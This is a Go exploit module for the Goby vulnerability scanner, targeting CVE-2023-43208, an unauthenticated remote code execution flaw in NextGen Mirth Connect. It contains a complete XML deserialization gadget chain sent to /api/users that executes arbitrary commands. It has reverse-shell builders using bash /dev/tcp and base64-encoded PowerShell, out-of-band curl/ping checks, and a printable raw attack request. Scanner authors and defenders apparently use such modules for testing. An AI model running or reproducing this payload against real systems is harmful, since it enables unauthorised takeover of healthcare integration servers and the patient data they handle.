package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "NextGen Mirth Connect /api/users Remote Code Execution Vulnerability (CVE-2023-43208)",
    "Description": "<p>NextGen Healthcare Mirth Connect before version 4.4.1 is vulnerable to unauthenticated remote code execution.</p>",
    "Product": "nextgen-Mirth-Connect-Admin",
    "Homepage": "https://www.nextgen.com/solutions/interoperability/mirth-integration-engine",
    "DisclosureDate": "2023-10-26",
    "PostTime": "2024-06-25",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title=\"Mirth Connect Administrator\" && (body=\"images/MirthConnect_Logo_WordMark_Big.png\" || body=\"images/mirthconnectlogowide.png\" || body=\"mirthconnectlogowide.png\")",
    "GobyQuery": "title=\"Mirth Connect Administrator\" && (body=\"images/MirthConnect_Logo_WordMark_Big.png\" || body=\"images/mirthconnectlogowide.png\" || body=\"mirthconnectlogowide.png\")",
    "Level": "2",
    "Impact": "<p>An attacker can exploit this vulnerability to remotely execute arbitrary code.</p>",
    "Recommendation": "<p>Upgrade to version 4.4.1 or above.</p>",
    "References": [
        "https://avd.aliyun.com/detail?id=AVD-2023-43208",
        "https://nvd.nist.gov/vuln/detail/CVE-2023-43208"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "reverse,request_data",
            "show": ""
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByPowershellBase64,ByBash",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2023-43208"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.1",
    "Translation": {
        "CN": {
            "Name": "Mirth Connect /api/users 反序列化远程代码执行漏洞 （CVE-2023-43208）",
            "Product": "nextgen-Mirth-Connect-Admin",
            "Description": "<p>NextGen Mirth Connect是用Java语言实现的 HL7 标准的接口网关，它是一个开源、跨平台的接口集成引擎。CVE-2023-43208 中攻击者可在无需登陆的情况下构造恶意请求造成远程代码执行漏洞，控制服务器。<br></p>",
            "Recommendation": "<p>升级至4.4.1 及其版本以上。<br></p>",
            "Impact": "<p>攻击者可在无需登陆的情况下构造恶意请求造成远程代码执行漏洞，控制服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "NextGen Mirth Connect /api/users Remote Code Execution Vulnerability (CVE-2023-43208)",
            "Product": "nextgen-Mirth-Connect-Admin",
            "Description": "<p>NextGen Healthcare Mirth Connect before version 4.4.1 is vulnerable to unauthenticated remote code execution.<br></p>",
            "Recommendation": "<p>Upgrade to version 4.4.1 or above.<br></p>",
            "Impact": "<p>An attacker can exploit this vulnerability to remotely execute arbitrary code.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10963"
}`
	// setPayloadRequestHash函数需要再后面增加随机字符串，避免重名
	setPayloadRequestHash7865 := func(hostInfo *httpclient.FixUrl, command string) (ok bool, vulURL string, err error) {
		//请注意：command字段是原始的命令，如果漏洞利用需要对命令进行编码，则需在此处编码
		command = strings.ReplaceAll(command, "&", "&amp;")
		command = strings.ReplaceAll(command, "<", "&lt;")
		command = strings.ReplaceAll(command, ">", "&gt;")
		command = strings.ReplaceAll(command, "\"", "&quot;")
		command = strings.ReplaceAll(command, "'", "&apos;")
		makeRequest := httpclient.NewPostRequestConfig("/api/users")
		makeRequest.VerifyTls = false
		makeRequest.Timeout = 10
		makeRequest.FollowRedirect = false
		makeRequest.Header.Store("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.0; rv:109.0) Gecko/20100101 Firefox/118.0")
		makeRequest.Header.Store("X-Requested-With", "OpenAPI")
		makeRequest.Header.Store("Content-Type", "application/xml")
		xml_data := `
                <sorted-set>
                    <string>abcd</string>
                    <dynamic-proxy>
                        <interface>java.lang.Comparable</interface>
                        <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
                            <target class="org.apache.commons.collections4.functors.ChainedTransformer">
                                <iTransformers>
                                    <org.apache.commons.collections4.functors.ConstantTransformer>
                                        <iConstant class="java-class">java.lang.Runtime</iConstant>
                                    </org.apache.commons.collections4.functors.ConstantTransformer>
                                    <org.apache.commons.collections4.functors.InvokerTransformer>
                                        <iMethodName>getMethod</iMethodName>
                                        <iParamTypes>
                                            <java-class>java.lang.String</java-class>
                                            <java-class>[Ljava.lang.Class;</java-class>
                                        </iParamTypes>
                                        <iArgs>
                                            <string>getRuntime</string>
                                            <java-class-array/>
                                        </iArgs>
                                    </org.apache.commons.collections4.functors.InvokerTransformer>
                                    <org.apache.commons.collections4.functors.InvokerTransformer>
                                        <iMethodName>invoke</iMethodName>
                                        <iParamTypes>
                                            <java-class>java.lang.Object</java-class>
                                            <java-class>[Ljava.lang.Object;</java-class>
                                        </iParamTypes>
                                        <iArgs>
                                            <null/>
                                            <object-array/>
                                        </iArgs>
                                    </org.apache.commons.collections4.functors.InvokerTransformer>
                                    <org.apache.commons.collections4.functors.InvokerTransformer>
                                        <iMethodName>exec</iMethodName>
                                        <iParamTypes>
                                            <java-class>java.lang.String</java-class>
                                        </iParamTypes>
                                        <iArgs>
                                            <string>` + command + `</string>
                                        </iArgs>
                                    </org.apache.commons.collections4.functors.InvokerTransformer>
                                </iTransformers>
                            </target>
                            <methodName>transform</methodName>
                            <eventTypes>
                                <string>compareTo</string>
                            </eventTypes>
                        </handler>
                    </dynamic-proxy>
                </sorted-set>
                `
		//请注意：ok值为，true代表命令执行成功，false代表命令执行失败
		makeRequest.Data = xml_data
		vulURL = "/api/users"
		if _, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
			ok = true
			return ok, vulURL, nil
		}
		ok = false
		//请注意：vulURL 字段为检测后显示的风险路径，示例值为：/path/to/vulable.jsp
		return ok, vulURL, err
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//请注意：在此处将setPayloadRequestHash0001函数赋值给runPayload
			runPayload := setPayloadRequestHash7865

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			checkStr := goutils.RandomHexString(6)
			checkUrl, isDomain := godclient.GetGodCheckURL(checkStr)

			//请注意：若漏洞环境特殊，可自行修改为wget、或其他能够出发HTTPLog的命令，由于部分godserver没有域名，所以尽量使用HTTPLog的方式
			pocCommand := "curl " + checkUrl
			if isDomain {
				pocCommand = "ping -c 1 " + checkUrl
			}

			ok, vulUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil || !ok {
				return false
			}
			if godclient.PullExists(checkStr, time.Second*15) {
				ss.VulURL = hostInfo.FixedHostInfo + vulUrl
				return true
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//请注意：在此处将setPayloadRequestHash0001函数赋值给runPayload
			runPayload := setPayloadRequestHash7865

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBash" {
							reRequest := regexp.MustCompile("(/dev/tcp/((.|\n)*?)/[0-9]+)")
							getserver := reRequest.FindStringSubmatch(command)
							command = "/bin/bash -c bash${IFS}-i${IFS}>&" + getserver[1] + "<&1"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "request_data":
				//配置命令
				postdata := `请求POST数据包如下(其中<和>经过编码需要自己转化)
POST /api/users HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14.0; rv:109.0) Gecko/20100101 Firefox/118.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
X-Requested-With: OpenAPI
Content-Type: application/xml
Content-Length: 4683


                <sorted-set>
                    <string>abcd</string>
                    <dynamic-proxy>
                        <interface>java.lang.Comparable</interface>
                        <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
                            <target class="org.apache.commons.collections4.functors.ChainedTransformer">
                                <iTransformers>
                                    <org.apache.commons.collections4.functors.ConstantTransformer>
                                        <iConstant class="java-class">java.lang.Runtime</iConstant>
                                    </org.apache.commons.collections4.functors.ConstantTransformer>
                                    <org.apache.commons.collections4.functors.InvokerTransformer>
                                        <iMethodName>getMethod</iMethodName>
                                        <iParamTypes>
                                            <java-class>java.lang.String</java-class>
                                            <java-class>[Ljava.lang.Class;</java-class>
                                        </iParamTypes>
                                        <iArgs>
                                            <string>getRuntime</string>
                                            <java-class-array/>
                                        </iArgs>
                                    </org.apache.commons.collections4.functors.InvokerTransformer>
                                    <org.apache.commons.collections4.functors.InvokerTransformer>
                                        <iMethodName>invoke</iMethodName>
                                        <iParamTypes>
                                            <java-class>java.lang.Object</java-class>
                                            <java-class>[Ljava.lang.Object;</java-class>
                                        </iParamTypes>
                                        <iArgs>
                                            <null/>
                                            <object-array/>
                                        </iArgs>
                                    </org.apache.commons.collections4.functors.InvokerTransformer>
                                    <org.apache.commons.collections4.functors.InvokerTransformer>
                                        <iMethodName>exec</iMethodName>
                                        <iParamTypes>
                                            <java-class>java.lang.String</java-class>
                                        </iParamTypes>
                                        <iArgs>
                                            <string>curl http://ip:port</string>
                                        </iArgs>
                                    </org.apache.commons.collections4.functors.InvokerTransformer>
                                </iTransformers>
                            </target>
                            <methodName>transform</methodName>
                            <eventTypes>
                                <string>compareTo</string>
                            </eventTypes>
                        </handler>
                    </dynamic-proxy>
                </sorted-set>`
				expResult.Success = true
				expResult.Output = postdata
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])
				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
